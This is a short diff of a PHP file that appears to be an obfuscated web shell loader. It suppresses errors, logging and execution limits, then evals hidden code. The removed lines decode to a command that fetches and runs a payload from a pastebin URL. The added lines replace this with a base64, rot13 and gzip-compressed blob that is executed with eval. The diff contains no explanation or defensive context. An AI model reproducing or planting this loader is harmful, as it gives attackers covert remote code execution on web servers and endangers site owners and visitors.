@@ -1,9 +1,8 @@
 <?php
-// https://pastebin.com/raw/61HesRtk
+// https://pastebin.com/raw/MF2RHxMi
 session_start();
 error_reporting(0);
 set_time_limit(0);
-date_default_timezone_set('Asia/Jakarta');
 @set_magic_quotes_runtime(0);
 @clearstatcache();
 @ini_set('error_log',NULL);
@@ -11,6 +10,6 @@ date_default_timezone_set('Asia/Jakarta');
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors',0);
-$kudagans = 'cmlueSh0bXZhc3luZ3Iob25mcjY0X3FycGJxcihzdnlyX3RyZ19wYmFncmFnZigndWdnY2Y6Ly9jbmZncm92YS5wYnovZW5qL08yZzNzdW93JykpKSk7';error_reporting(0);@set_time_limit(0);
-eval(str_rot13(base64_decode($kudagans)));
+$xBarakuda = "AasAVP8NwcsSgiAUANB/dnIrpYfZNC7SSCKUTbd506hEUEWY+OTr6xzWcsJrd/5siKxuhnfqWy0bNDfyWTF7ZLuzT96ZMYlsOSc+r+Lc207REZDIj/gsiNTqgERB8fg5VI6UOGz3SUZnkPQtiBp4V0atWQhEodDCJL6OpTYDEa+xtXnhEsKLS8mzxansU+4MlF4BxsGjx30QiXimy+CMQcR722n1vaRnu2jdyfRi8wM=";error_reporting(0);@set_time_limit(0);
+eval(gzinflate(str_rot13(gzinflate(base64_decode($xBarakuda)))));
 ?>
